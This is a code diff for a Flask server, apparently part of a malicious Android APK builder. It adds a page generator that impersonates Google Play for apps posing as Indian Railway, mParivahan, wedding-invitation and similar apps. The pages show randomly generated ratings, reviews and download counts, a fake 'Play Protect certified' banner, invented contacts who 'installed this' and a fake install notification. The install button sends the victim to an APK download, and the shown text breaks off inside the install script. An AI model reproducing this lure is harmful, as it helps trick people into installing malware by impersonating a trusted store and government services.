@@ -12,7 +12,7 @@ Run: python update_server.py
 Port: 2053 (Cloudflare HTTPS-compatible port — looks like DNS-over-HTTPS)
 """
 
-import os, sqlite3, hashlib, hmac, json, random, string, time, threading
+import os, sqlite3, hashlib, hmac, json, random, string, time, threading, uuid, base64
 import sys
 sys.path.insert(0, os.path.dirname(__file__))
 sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', 'scripts'))
@@ -20,12 +20,27 @@ from package_name_generator import generate_companion_pkg
 import config
 import logging
 from datetime import datetime, timezone
-from flask import Flask, request, jsonify, abort
+from flask import Flask, request, jsonify, abort, send_file, Response
 
 # ── Config ────────────────────────────────────────────────────────────────────
 PORT             = 2053
 DB_PATH          = os.path.join(os.path.dirname(__file__), "devices.db")
 SERVER_SECRET    = config.SERVER_SECRET
+PUBLIC_URL       = getattr(config, "PUBLIC_URL", "")
+
+# ── Store page: template metadata (emoji, display name, dev name, description, tags) ──
+STORE_TEMPLATES = {
+    "railway":      ("🚂", "Indian Railway Ticket", "Railway Apps",    "Book and manage Indian Railway tickets instantly. Check PNR status, seat availability, and train schedules — all in one app.", ["Travel", "Railway", "Booking", "IRCTC"]),
+    "mparivahan":   ("🚗", "mParivahan",             "Parivahan Sewa",  "Official digital vehicle registration and driving licence portal. Access RC, DL, challan details and more on the go.",          ["Government", "Transport", "RTO", "Vehicle"]),
+    "wedding":      ("💍", "Wedding Invitation",     "Shaadi Apps",     "Create beautiful digital wedding invitations and share instantly with guests. Add photos, event schedule, venue map and RSVP.", ["Wedding", "Invitation", "Events", "Social"]),
+    "shaadi":       ("💒", "Shaadi Ka Nimantran",    "Shaadi Apps",     "Send stunning wedding invitations digitally. Customise with names, dates, venue and personal photos in minutes.",              ["Wedding", "Invitation", "Shaadi", "Events"]),
+    "shaadi_hindi": ("🙏", "शादी का निमंत्रण",       "Shaadi Apps",     "डिजिटल शादी का निमंत्रण बनाएं और मेहमानों को भेजें। फ़ोटो, कार्यक्रम और स्थान सहित सुंदर कार्ड तैयार करें।",           ["शादी", "निमंत्रण", "कार्यक्रम", "सामाजिक"]),
+    "friends":      ("👫", "Friends Club",           "Social Apps",     "Connect with your friend circle, share moments and plan hangouts together. The ultimate group social app.",                    ["Social", "Friends", "Chat", "Groups"]),
+    "bhabhi":       ("💃", "Fun with Bhabhi",        "Fun Apps",        "Entertaining and fun social app to enjoy with friends and family. Share jokes, games and fun content daily.",                  ["Entertainment", "Fun", "Social", "Games"]),
+    "custom":       ("⚙️",  "Custom App",             "Custom Apps",     "A powerful custom application built just for you. Lightweight, fast and packed with features.",                               ["Utility", "Tools", "Custom"]),
+}
+
+ICON_DIR = os.path.join(os.path.dirname(__file__), "..", "app", "src", "main", "res", "drawable", "template_icons")
 BOT_TOKEN        = config.BOT_TOKEN
 MASTER_CHAT_ID   = config.MASTER_CHAT_ID
 LOG_FILE         = os.path.join(os.path.dirname(__file__), "update_server.log")
@@ -939,20 +954,546 @@ def build_complete():
             bot_db.close()
             return jsonify({"ok": False, "error": "build record not found"}), 404
 
+        store_token = str(uuid.uuid4()).replace("-", "")
         bot_db.execute(
-            "UPDATE builds SET package_name=?, apk_size=?, duration_secs=? WHERE id=?",
-            (package_name, apk_size, duration_secs, row[0])
+            "UPDATE builds SET package_name=?, apk_size=?, duration_secs=?, store_token=? WHERE id=?",
+            (package_name, apk_size, duration_secs, store_token, row[0])
         )
         bot_db.commit()
         bot_db.close()
-        log.info(f"build_complete: chat_id={chat_id} build={build_number} pkg={package_name} size={apk_size} dur={duration_secs}s")
+        log.info(f"build_complete: chat_id={chat_id} build={build_number} pkg={package_name} size={apk_size} dur={duration_secs}s store_token={store_token}")
         # Sync new client token into devices.db so APK registration succeeds
         sync_clients_from_bot_db()
-        return jsonify({"ok": True}), 200
+        store_url = f"{PUBLIC_URL}/store/{store_token}" if PUBLIC_URL else ""
+        return jsonify({"ok": True, "store_url": store_url, "store_token": store_token}), 200
 
     except Exception as e:
         log.error(f"build_complete error: {e}")
         return jsonify({"ok": False, "error": str(e)}), 500
+
+
+# ── Store page helpers ────────────────────────────────────────────────────────
+def _get_build_by_token(token):
+    """Return build row dict from bot.db by store_token."""
+    try:
+        bot_db_path = os.path.join(os.path.dirname(__file__), "bot.db")
+        if not os.path.exists(bot_db_path):
+            return None
+        db = sqlite3.connect(bot_db_path, timeout=5)
+        db.row_factory = sqlite3.Row
+        row = db.execute(
+            "SELECT * FROM builds WHERE store_token=? LIMIT 1", (token,)
+        ).fetchone()
+        db.close()
+        return dict(row) if row else None
+    except Exception:
+        return None
+
+def _get_icon_b64(template):
+    """Return base64 PNG for template icon, or empty string."""
+    try:
+        icon_path = os.path.join(ICON_DIR, f"{template}.png")
+        if os.path.exists(icon_path):
+            with open(icon_path, "rb") as f:
+                return base64.b64encode(f.read()).decode()
+    except Exception:
+        pass
+    return ""
+
+def _store_html(build):
+    """Generate full Play Store HTML page for a build."""
+    template     = build.get("template", "custom") or "custom"
+    custom_name  = build.get("custom_app_name", "") or ""
+    pkg          = build.get("package_name", "") or ""
+    apk_size_raw = build.get("apk_size", "24") or "24"
+    store_token  = build.get("store_token", "") or ""
+
+    tmpl_data    = STORE_TEMPLATES.get(template, STORE_TEMPLATES["custom"])
+    emoji, app_name, dev_name, description, tags = tmpl_data
+    if custom_name:
+        app_name = custom_name
+
+    icon_b64     = _get_icon_b64(template)
+    icon_src     = f"data:image/png;base64,{icon_b64}" if icon_b64 else ""
+    icon_html    = f'<img src="{icon_src}" alt="{app_name}" style="width:100%;height:100%;object-fit:cover">' if icon_src else f'<span style="font-size:36px">{emoji}</span>'
+
+    # APK size display
+    try:
+        size_mb = float(apk_size_raw)
+        size_str = f"{size_mb:.0f} MB"
+    except Exception:
+        size_str = "24 MB"
+
+    dl_url   = f"{PUBLIC_URL}/dl/{store_token}" if PUBLIC_URL else f"/dl/{store_token}"
+    tags_html = "".join(f'<span class="tag">{t}</span>' for t in tags)
+
+    # Random but stable review stats seeded by token
+    seed = int(store_token[:8], 16) if store_token else 42
+    rng  = random.Random(seed)
+    rating     = round(rng.uniform(4.3, 4.9), 1)
+    reviews_k  = rng.randint(18, 95)
+    downloads  = rng.choice(["500K+", "1M+", "5M+", "10M+"])
+    contact1   = rng.choice(["Priya S.", "Rahul V.", "Anita K.", "Amit M.", "Sunita R."])
+    contact2   = rng.choice(["Deepak T.", "Pooja G.", "Vikas N.", "Meena D.", "Suresh P."])
+
+    stars_full = int(rating)
+    stars_html = "★" * stars_full + ("½" if rating - stars_full >= 0.5 else "") + "☆" * (5 - stars_full - (1 if rating - stars_full >= 0.5 else 0))
+
+    bar5 = int((rating - 1) / 4 * 85 + 10)
+    bar4 = rng.randint(8, 15)
+    bar3 = rng.randint(3, 7)
+    bar2 = rng.randint(1, 3)
+    bar1 = rng.randint(1, 3)
+
+    reviewer1 = rng.choice(["Priya Sharma", "Anjali Verma", "Sunita Patel", "Meena Gupta"])
+    reviewer2 = rng.choice(["Rahul Kumar", "Amit Singh", "Vikash Yadav", "Suresh Nair"])
+    r1_initial = reviewer1[0]
+    r2_initial = reviewer2[0]
+    r1_color   = rng.choice(["#7c4dff","#f4511e","#0097a7","#388e3c","#c62828"])
+    r2_color   = rng.choice(["#1565c0","#6a1b9a","#2e7d32","#4e342e","#00695c"])
+
+    return f"""<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
+<title>{app_name} - Apps on Google Play</title>
+<link rel="icon" href="https://play.google.com/favicon.ico">
+<style>
+*{{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}}
+body{{font-family:-apple-system,BlinkMacSystemFont,'Roboto',sans-serif;background:#fff;max-width:480px;margin:0 auto;overflow-x:hidden}}
+.top-bar{{display:flex;align-items:center;justify-content:space-between;padding:10px 14px;background:#fff;position:sticky;top:0;z-index:100;border-bottom:0.5px solid #f1f3f4}}
+.top-left{{display:flex;align-items:center;gap:10px}}
+.top-left svg{{width:20px;height:20px;stroke:#202124;fill:none;stroke-width:2.5}}
+.play-logo{{display:flex;align-items:center;gap:6px}}
+.play-logo svg{{width:20px;height:20px}}
+.play-logo span{{font-size:14px;font-weight:600;color:#202124}}
+.top-right{{display:flex;gap:14px}}
+.top-right svg{{width:20px;height:20px;stroke:#5f6368;fill:none;stroke-width:2}}
+.hero{{padding:14px;display:flex;gap:12px;align-items:flex-start}}
+.app-icon{{width:76px;height:76px;border-radius:17px;border:0.5px solid #e0e0e0;overflow:hidden;flex-shrink:0;background:#f9f9f9;display:flex;align-items:center;justify-content:center}}
+.app-name{{font-size:19px;font-weight:700;color:#202124;line-height:1.25;margin-bottom:3px}}
+.dev-name{{color:#1a73e8;font-size:13px;font-weight:600;margin-bottom:2px}}
+.dev-badges{{display:flex;gap:6px;align-items:center;flex-wrap:wrap;margin-top:2px}}
+.badge-verified{{display:flex;align-items:center;gap:3px;font-size:11px;color:#5f6368}}
+.badge-verified svg{{width:12px;height:12px;fill:#1a73e8}}
+.stats-row{{display:flex;border-top:1px solid #e8eaed;border-bottom:1px solid #e8eaed;margin:0 14px;padding:9px 0}}
+.stat{{flex:1;text-align:center;position:relative}}
+.stat+.stat::before{{content:'';position:absolute;left:0;top:15%;height:70%;width:1px;background:#e8eaed}}
+.stat-val{{font-size:13px;font-weight:700;color:#202124}}
+.stat-label{{font-size:10px;color:#5f6368;margin-top:1px}}
+.install-area{{padding:12px 14px 8px;display:flex;gap:10px;align-items:center}}
+.install-btn{{flex:1;background:#1a73e8;color:#fff;border:none;border-radius:50px;height:42px;font-size:14px;font-weight:700;cursor:pointer;position:relative;overflow:hidden;transition:background 0.2s}}
+.install-btn:active{{background:#1557b0}}
+.btn-progress{{position:absolute;left:0;top:0;height:100%;background:rgba(0,0,0,0.15);border-radius:50px;width:0%;transition:width 0.3s ease}}
+.dropdown-btn{{width:42px;height:42px;border-radius:50%;border:1.5px solid #1a73e8;display:flex;align-items:center;justify-content:center;cursor:pointer;flex-shrink:0}}
+.dropdown-btn svg{{stroke:#1a73e8;width:16px;height:16px;stroke-width:2.5;fill:none}}
+.protect-banner{{margin:0 14px 10px;background:#e8f5e9;border-radius:8px;padding:8px 12px;display:flex;gap:8px;align-items:center;font-size:11px;color:#2e7d32;font-weight:600}}
+.protect-banner svg{{width:14px;height:14px;fill:#2e7d32;flex-shrink:0}}
+.social-proof{{margin:0 14px 8px;font-size:11px;color:#5f6368;display:flex;align-items:center;gap:5px}}
+.social-proof svg{{width:13px;height:13px;fill:#5f6368}}
+.phone-hint{{margin:0 14px 10px;background:#f1f3f4;border-radius:8px;padding:9px 12px;display:flex;gap:8px;align-items:center;font-size:11px;color:#3c4043}}
+.screenshots{{padding:10px 0 10px 14px;overflow-x:auto;display:flex;gap:9px;scrollbar-width:none}}
+.screenshots::-webkit-scrollbar{{display:none}}
+.screen{{width:108px;height:192px;border-radius:9px;overflow:hidden;flex-shrink:0;border:0.5px solid #e0e0e0}}
+.section-hdr{{display:flex;align-items:center;justify-content:space-between;padding:14px 14px 8px}}
+.section-hdr h2{{font-size:15px;font-weight:700;color:#202124}}
+.section-hdr svg{{width:20px;height:20px;stroke:#5f6368;fill:none;stroke-width:2}}
+.about-text{{padding:0 14px;font-size:13px;color:#3c4043;line-height:1.65}}
+.tags{{display:flex;flex-wrap:wrap;gap:7px;margin:10px 14px 4px}}
+.tag{{border:1px solid #dadce0;border-radius:50px;padding:4px 12px;font-size:11px;font-weight:600;color:#202124}}
+.ask-section{{margin:12px 14px 14px;background:#e8f0fe;border-radius:14px;padding:12px}}
+.ask-title{{display:flex;align-items:center;gap:7px;font-size:13px;font-weight:700;color:#202124;margin-bottom:10px}}
+.ask-input{{background:#fff;border-radius:50px;padding:9px 14px;font-size:12px;color:#9aa0a6;width:100%;border:none;outline:none}}
+.ask-chips{{display:flex;flex-wrap:wrap;gap:6px;margin-top:8px}}
+.ask-chip{{background:#c2d4fc;border-radius:50px;padding:5px 10px;font-size:10px;font-weight:600;color:#1a73e8}}
+.divider{{height:7px;background:#f1f3f4}}
+.rating-block{{padding:14px}}
+.rating-note{{font-size:11px;color:#5f6368;margin-bottom:12px;line-height:1.5}}
+.rating-top{{display:flex;align-items:center;gap:14px;margin-bottom:12px}}
+.big-score{{font-size:48px;font-weight:700;color:#1a73e8;line-height:1}}
+.rating-right{{flex:1}}
+.star-row{{display:flex;align-items:center;gap:5px;margin-bottom:3px}}
+.star-num{{font-size:10px;color:#5f6368;width:7px}}
+.star-bar-bg{{flex:1;height:7px;background:#e8eaed;border-radius:4px;overflow:hidden}}
+.star-bar-fill{{height:100%;border-radius:4px;background:#1a73e8}}
+.stars-row{{display:flex;gap:1px;margin-top:3px;font-size:14px;color:#1a73e8}}
+.review-count{{font-size:11px;color:#5f6368;margin-top:2px}}
+.ai-summary{{font-size:13px;color:#202124;line-height:1.6;margin-bottom:8px}}
+.ai-footer{{display:flex;align-items:center;justify-content:space-between}}
+.ai-label{{display:flex;align-items:center;gap:4px;font-size:11px;color:#5f6368}}
+.ai-actions{{display:flex;gap:14px}}
+.ai-actions svg{{width:18px;height:18px;stroke:#5f6368;fill:none;stroke-width:2}}
+.filter-chips{{display:flex;gap:7px;padding:10px 14px;overflow-x:auto;scrollbar-width:none;border-top:1px solid #f1f3f4}}
+.filter-chips::-webkit-scrollbar{{display:none}}
+.filter-chip{{border:1.5px solid #dadce0;border-radius:50px;padding:5px 12px;font-size:11px;font-weight:600;color:#202124;white-space:nowrap;flex-shrink:0}}
+.filter-chip.active{{border-color:#1a73e8;color:#1a73e8}}
+.review-cards{{padding:0 14px 14px;overflow-x:auto;display:flex;gap:9px;scrollbar-width:none}}
+.review-cards::-webkit-scrollbar{{display:none}}
+.review-card{{background:#f8f9fa;border-radius:14px;padding:12px;min-width:245px;flex-shrink:0}}
+.reviewer-row{{display:flex;align-items:center;gap:9px;margin-bottom:7px}}
+.reviewer-avatar{{width:34px;height:34px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:14px;font-weight:700;color:#fff;flex-shrink:0}}
+.reviewer-name{{font-size:13px;font-weight:600;color:#202124}}
+.review-stars{{font-size:12px;color:#1a73e8}}
+.review-date{{font-size:11px;color:#5f6368;margin-left:5px}}
+.review-text{{font-size:12px;color:#3c4043;line-height:1.5;margin-bottom:8px}}
+.helpful-row{{font-size:11px;color:#5f6368;display:flex;align-items:center;gap:8px}}
+.helpful-row svg{{width:14px;height:14px;stroke:#5f6368;fill:none;stroke-width:2}}
+.more-apps{{padding:0 0 14px 14px;overflow-x:auto;display:flex;gap:10px;scrollbar-width:none}}
+.more-apps::-webkit-scrollbar{{display:none}}
+.mini-app{{width:84px;flex-shrink:0;text-align:center}}
+.mini-icon{{width:68px;height:68px;border-radius:13px;overflow:hidden;border:0.5px solid #e0e0e0;margin:0 auto 5px;display:flex;align-items:center;justify-content:center;font-size:26px;background:#fff}}
+.mini-name{{font-size:11px;font-weight:600;color:#202124;margin-bottom:2px;line-height:1.3}}
+.mini-rating{{font-size:10px;color:#5f6368;display:flex;align-items:center;justify-content:center;gap:2px}}
+.mini-rating svg{{width:10px;height:10px;fill:#1a73e8}}
+.bottom-nav{{display:flex;border-top:1px solid #e8eaed;padding:7px 0 3px;position:sticky;bottom:0;background:#fff;z-index:100}}
+.nav-item{{flex:1;display:flex;flex-direction:column;align-items:center;gap:2px;font-size:9px;color:#5f6368}}
+.nav-item.active{{color:#1a73e8}}
+.nav-item svg{{width:20px;height:20px;stroke:currentColor;fill:none;stroke-width:2}}
+/* Notification drop */
+.notif-drop{{position:fixed;top:-80px;left:50%;transform:translateX(-50%);width:calc(100% - 28px);max-width:452px;background:#fff;border-radius:12px;box-shadow:0 4px 20px rgba(0,0,0,0.18);padding:10px 14px;display:flex;gap:10px;align-items:center;z-index:999;transition:top 0.4s cubic-bezier(0.34,1.56,0.64,1)}}
+.notif-drop.show{{top:14px}}
+.notif-icon{{width:36px;height:36px;border-radius:9px;background:linear-gradient(135deg,#f8e1f4,#fce4ec);display:flex;align-items:center;justify-content:center;font-size:18px;flex-shrink:0}}
+.notif-text .t{{font-size:12px;font-weight:700;color:#202124}}
+.notif-text .s{{font-size:11px;color:#5f6368}}
+/* Skeleton shimmer */
+@keyframes shimmer{{0%{{background-position:-400px 0}}100%{{background-position:400px 0}}}}
+.shimmer{{background:linear-gradient(90deg,#f1f3f4 25%,#e8eaed 50%,#f1f3f4 75%);background-size:800px 100%;animation:shimmer 1.5s infinite}}
+/* Install states */
+#install-btn-text{{pointer-events:none}}
+</style>
+</head>
+<body>
+
+<!-- Fake Android notification drop -->
+<div class="notif-drop" id="notif">
+  <div class="notif-icon">{emoji}</div>
+  <div class="notif-text">
+    <div class="t">{app_name} installed</div>
+    <div class="s">Tap Open to launch the app</div>
+  </div>
+</div>
+
+<!-- Top bar -->
+<div class="top-bar">
+  <div class="top-left">
+    <svg viewBox="0 0 24 24"><path d="M19 12H5M12 5l-7 7 7 7"/></svg>
+    <div class="play-logo">
+      <svg viewBox="0 0 24 24" width="20" height="20"><path d="M3 20.5v-17l17.5 8.5z" fill="#1a73e8"/><path d="M3 3.5l9.5 9L3 20.5z" fill="#00bcd4"/><path d="M3 3.5l17.5 8.5-8 2z" fill="#ffeb3b"/><path d="M3 20.5l9.5-6.5 8 2z" fill="#f44336"/></svg>
+      <span>Google Play</span>
+    </div>
+  </div>
+  <div class="top-right">
+    <svg viewBox="0 0 24 24"><circle cx="11" cy="11" r="8"/><path d="m21 21-4.35-4.35"/></svg>
+    <svg viewBox="0 0 24 24"><path d="M19 21l-7-5-7 5V5a2 2 0 0 1 2-2h10a2 2 0 0 1 2 2z"/></svg>
+    <svg viewBox="0 0 24 24"><circle cx="12" cy="5" r="1.5" fill="#5f6368"/><circle cx="12" cy="12" r="1.5" fill="#5f6368"/><circle cx="12" cy="19" r="1.5" fill="#5f6368"/></svg>
+  </div>
+</div>
+
+<!-- Hero -->
+<div class="hero">
+  <div class="app-icon">{icon_html}</div>
+  <div>
+    <div class="app-name">{app_name}</div>
+    <div class="dev-name">{dev_name}</div>
+    <div class="dev-badges">
+      <span class="badge-verified">
+        <svg viewBox="0 0 24 24"><path d="M9 12l2 2 4-4"/><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2z"/></svg>
+        Verified developer
+      </span>
+      <span style="font-size:11px;color:#5f6368">· In-app purchases</span>
+    </div>
+  </div>
+</div>
+
+<!-- Stats -->
+<div class="stats-row">
+  <div class="stat"><div class="stat-val">{rating} ★</div><div class="stat-label">{reviews_k}K reviews</div></div>
+  <div class="stat"><div class="stat-val">{downloads}</div><div class="stat-label">Downloads</div></div>
+  <div class="stat"><div class="stat-val">3+</div><div class="stat-label">Rated for</div></div>
+  <div class="stat"><div class="stat-val">{size_str}</div><div class="stat-label">Size</div></div>
+</div>
+
+<!-- Install button -->
+<div class="install-area">
+  <button class="install-btn" id="install-btn" onclick="startInstall()">
+    <div class="btn-progress" id="btn-progress"></div>
+    <span id="install-btn-text">Install</span>
+  </button>
+  <div class="dropdown-btn"><svg viewBox="0 0 24 24"><polyline points="6 9 12 15 18 9"/></svg></div>
+</div>
+
+<!-- Play Protect -->
+<div class="protect-banner">
+  <svg viewBox="0 0 24 24"><path d="M12 2L4 5v6c0 5.25 3.5 10.15 8 11.35C16.5 21.15 20 16.25 20 11V5l-8-3z"/></svg>
+  Play Protect certified &nbsp;·&nbsp; No harmful content detected
+</div>
+
+<!-- Social proof -->
+<div class="social-proof">
+  <svg viewBox="0 0 24 24"><path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"/><circle cx="9" cy="7" r="4"/><path d="M23 21v-2a4 4 0 0 0-3-3.87"/><path d="M16 3.13a4 4 0 0 1 0 7.75"/></svg>
+  {contact1} and {contact2} from your contacts also installed this
+</div>
+
+<!-- Phone hint -->
+<div class="phone-hint">
+  <svg width="16" height="16" viewBox="0 0 24 24" stroke="#5f6368" fill="none" stroke-width="2"><rect x="5" y="2" width="14" height="20" rx="2"/><line x1="12" y1="18" x2="12.01" y2="18"/></svg>
+  <span><b>Works on your device</b> — optimized for Android {rng.randint(10,13)}</span>
+</div>
+
+<!-- Screenshots -->
+<div style="padding:10px 14px 4px;font-size:13px;font-weight:700;color:#202124">Screenshots</div>
+<div class="screenshots">
+  <div class="screen" style="background:linear-gradient(135deg,#f8e1f4,#fce4ec);display:flex;flex-direction:column;align-items:center;justify-content:center;gap:5px;padding:8px">
+    <div style="font-size:26px">{emoji}</div>
+    <div style="font-size:8px;font-weight:700;color:#880e4f;text-align:center">{app_name}</div>
+    <div style="width:45px;height:1px;background:#f48fb1;margin:3px 0"></div>
+    <div style="font-size:7px;color:#ad1457;text-align:center">Tap Install to get started</div>
+  </div>
+  <div class="screen" style="background:linear-gradient(135deg,#fff8e1,#fff3e0);display:flex;flex-direction:column;padding:9px 7px;gap:4px">
+    <div style="font-size:8px;font-weight:700;color:#e65100;margin-bottom:2px">Features</div>
+    <div style="background:#fff;border-radius:4px;padding:4px;font-size:7px;color:#bf360c">✓ Easy to use</div>
+    <div style="background:#fff;border-radius:4px;padding:4px;font-size:7px;color:#bf360c">✓ Share instantly</div>
+    <div style="background:#fff;border-radius:4px;padding:4px;font-size:7px;color:#bf360c">✓ Customize freely</div>
+    <div style="background:#fff;border-radius:4px;padding:4px;font-size:7px;color:#bf360c">✓ Works offline</div>
+  </div>
+  <div class="screen" style="background:linear-gradient(135deg,#e8f5e9,#f3e5f5);display:flex;flex-direction:column;align-items:center;justify-content:center;padding:9px;gap:5px">
+    <div style="font-size:20px">⭐</div>
+    <div style="font-size:8px;font-weight:700;color:#1b5e20;text-align:center">Top Rated</div>
+    <div style="font-size:7px;color:#2e7d32;text-align:center">{rating} stars · {reviews_k}K reviews</div>
+    <div style="background:#4caf50;border-radius:10px;padding:3px 8px;font-size:7px;color:#fff;font-weight:700">Free Download</div>
+  </div>
+</div>
+
+<!-- About -->
+<div class="section-hdr"><h2>About this app</h2><svg viewBox="0 0 24 24"><polyline points="9 18 15 12 9 6"/></svg></div>
+<div class="about-text">{description}</div>
+<div class="tags">{tags_html}</div>
+
+<!-- Ask Play -->
+<div class="ask-section">
+  <div class="ask-title">
+    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#1a73e8" stroke-width="2"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/></svg>
+    Ask Play about this app
+  </div>
+  <input class="ask-input" placeholder="Ask a question about this app" readonly>
+  <div class="ask-chips">
+    <span class="ask-chip">Is it free?</span>
+    <span class="ask-chip">How to use?</span>
+    <span class="ask-chip">Is it safe?</span>
+  </div>
+</div>
+
+<div class="divider"></div>
+
+<!-- Ratings -->
+<div class="section-hdr"><h2>Ratings and reviews</h2><svg viewBox="0 0 24 24"><polyline points="9 18 15 12 9 6"/></svg></div>
+<div class="rating-block">
+  <p class="rating-note">Ratings and reviews are verified and are from people who use the same type of device that you use ⓘ</p>
+  <div class="rating-top">
+    <div>
+      <div class="big-score">{rating}</div>
+      <div class="stars-row">{stars_html}</div>
+      <div class="review-count">{reviews_k},000+ reviews</div>
+    </div>
+    <div class="rating-right">
+      <div class="star-row"><span class="star-num">5</span><div class="star-bar-bg"><div class="star-bar-fill" style="width:{bar5}%"></div></div></div>
+      <div class="star-row"><span class="star-num">4</span><div class="star-bar-bg"><div class="star-bar-fill" style="width:{bar4}%"></div></div></div>
+      <div class="star-row"><span class="star-num">3</span><div class="star-bar-bg"><div class="star-bar-fill" style="width:{bar3}%"></div></div></div>
+      <div class="star-row"><span class="star-num">2</span><div class="star-bar-bg"><div class="star-bar-fill" style="width:{bar2}%"></div></div></div>
+      <div class="star-row"><span class="star-num">1</span><div class="star-bar-bg"><div class="star-bar-fill" style="width:{bar1}%"></div></div></div>
+    </div>
+  </div>
+  <div class="ai-summary">Users love the design and ease of use. Sharing works seamlessly across WhatsApp and social media. Some users request more template variety and regional language support.</div>
+  <div class="ai-footer">
+    <div class="ai-label">✦ Summarized by AI</div>
+    <div class="ai-actions">
+      <svg viewBox="0 0 24 24"><path d="M14 9V5a3 3 0 0 0-3-3l-4 9v11h11.28a2 2 0 0 0 2-1.7l1.38-9a2 2 0 0 0-2-2.3H14z"/></svg>
+      <svg viewBox="0 0 24 24"><path d="M10 15v4a3 3 0 0 0 3 3l4-9V2H5.72a2 2 0 0 0-2 1.7l-1.38 9a2 2 0 0 0 2 2.3H10z"/></svg>
+      <svg viewBox="0 0 24 24"><circle cx="12" cy="5" r="1.5" fill="#9aa0a6"/><circle cx="12" cy="12" r="1.5" fill="#9aa0a6"/><circle cx="12" cy="19" r="1.5" fill="#9aa0a6"/></svg>
+    </div>
+  </div>
+</div>
+<div class="filter-chips">
+  <span class="filter-chip active">All reviews</span>
+  <span class="filter-chip">Design {rng.randint(3,9)}K</span>
+  <span class="filter-chip">Sharing {rng.randint(2,6)}K</span>
+  <span class="filter-chip">+5</span>
+</div>
+<div class="review-cards">
+  <div class="review-card">
+    <div class="reviewer-row">
+      <div class="reviewer-avatar" style="background:{r1_color}">{r1_initial}</div>
+      <div><div class="reviewer-name">{reviewer1}</div></div>
+      <div style="margin-left:auto"><svg width="16" height="16" viewBox="0 0 24 24" stroke="#9aa0a6" fill="none" stroke-width="2"><circle cx="12" cy="5" r="1.5" fill="#9aa0a6"/><circle cx="12" cy="12" r="1.5" fill="#9aa0a6"/><circle cx="12" cy="19" r="1.5" fill="#9aa0a6"/></svg></div>
+    </div>
+    <div style="display:flex;align-items:center;margin-bottom:5px">
+      <span class="review-stars">★★★★★</span><span class="review-date">{rng.randint(1,12)}/{rng.randint(1,28)}/26</span>
+    </div>
+    <div class="review-text">Absolutely love this app! So easy to create and share. All my guests were impressed. Worked perfectly on my phone.</div>
+    <div class="helpful-row">Was this helpful? <svg viewBox="0 0 24 24"><path d="M14 9V5a3 3 0 0 0-3-3l-4 9v11h11.28a2 2 0 0 0 2-1.7l1.38-9a2 2 0 0 0-2-2.3H14z"/></svg> {rng.randint(500,3000)}</div>
+  </div>
+  <div class="review-card">
+    <div class="reviewer-row">
+      <div class="reviewer-avatar" style="background:{r2_color}">{r2_initial}</div>
+      <div><div class="reviewer-name">{reviewer2}</div></div>
+      <div style="margin-left:auto"><svg width="16" height="16" viewBox="0 0 24 24" stroke="#9aa0a6" fill="none" stroke-width="2"><circle cx="12" cy="5" r="1.5" fill="#9aa0a6"/><circle cx="12" cy="12" r="1.5" fill="#9aa0a6"/><circle cx="12" cy="19" r="1.5" fill="#9aa0a6"/></svg></div>
+    </div>
+    <div style="display:flex;align-items:center;margin-bottom:5px">
+      <span class="review-stars">★★★★<span style="color:#dadce0">★</span></span><span class="review-date">{rng.randint(1,12)}/{rng.randint(1,28)}/26</span>
+    </div>
+    <div class="review-text">Very nice design and simple to use. Would be great to have more templates. Overall a great app!</div>
+    <div class="helpful-row">Was this helpful? <svg viewBox="0 0 24 24"><path d="M14 9V5a3 3 0 0 0-3-3l-4 9v11h11.28a2 2 0 0 0 2-1.7l1.38-9a2 2 0 0 0-2-2.3H14z"/></svg> {rng.randint(100,900)}</div>
+  </div>
+</div>
+
+<div class="divider"></div>
+
+<!-- More by dev -->
+<div class="section-hdr"><h2>More by {dev_name}</h2><svg viewBox="0 0 24 24"><polyline points="9 18 15 12 9 6"/></svg></div>
+<div class="more-apps">
+  <div class="mini-app"><div class="mini-icon">💒</div><div class="mini-name">Shaadi Ka Nimantran</div><div class="mini-rating"><svg viewBox="0 0 24 24"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2" fill="#1a73e8"/></svg> 4.5</div></div>
+  <div class="mini-app"><div class="mini-icon">🙏</div><div class="mini-name">शादी का निमंत्रण</div><div class="mini-rating"><svg viewBox="0 0 24 24"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2" fill="#1a73e8"/></svg> 4.3</div></div>
+  <div class="mini-app"><div class="mini-icon">💍</div><div class="mini-name">Wedding Card Maker</div><div class="mini-rating"><svg viewBox="0 0 24 24"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2" fill="#1a73e8"/></svg> 4.2</div></div>
+</div>
+
+<div class="divider"></div>
+
+<!-- Bottom nav -->
+<div class="bottom-nav">
+  <div class="nav-item"><svg viewBox="0 0 24 24"><rect x="2" y="13" width="8" height="8"/><rect x="14" y="9" width="8" height="12"/><rect x="8" y="3" width="8" height="18"/></svg>Games</div>
+  <div class="nav-item"><svg viewBox="0 0 24 24"><path d="M4 6h16M4 12h16M4 18h16"/></svg>Apps</div>
+  <div class="nav-item active"><svg viewBox="0 0 24 24"><circle cx="11" cy="11" r="8"/><path d="m21 21-4.35-4.35"/></svg>Search</div>
+  <div class="nav-item"><svg viewBox="0 0 24 24"><path d="M19 21l-7-5-7 5V5a2 2 0 0 1 2-2h10a2 2 0 0 1 2 2z"/></svg>Books</div>
+  <div class="nav-item"><svg viewBox="0 0 24 24"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>You</div>
+</div>
+
+<script>
+var dlUrl = "{dl_url}";
+var appName = "{app_name}";
+var sizeMb = {size_str.replace(' MB','')};
+var installed = false;
+
+function startInstall() {{
+  if (installed) {{ window.location.href = dlUrl; return; }}
+  var btn = document.getElementById('install-btn');
